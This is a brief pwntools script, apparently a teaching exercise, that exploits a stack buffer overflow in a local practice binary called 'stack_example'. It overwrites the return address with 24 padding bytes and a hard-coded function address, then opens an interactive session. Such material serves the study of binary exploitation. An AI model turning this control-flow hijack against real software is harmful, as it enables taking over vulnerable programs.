#!/usr/bin/env python
# -*-coding=utf8-*-
from pwn import *
p = process('./stack_example')
success_addr = 0x0804843b
offset = 24
payload = 'A' * offset + p32(success_addr)
print p32(success_addr)
# gdb.attach(p)
p.sendline(payload)
p.interactive()
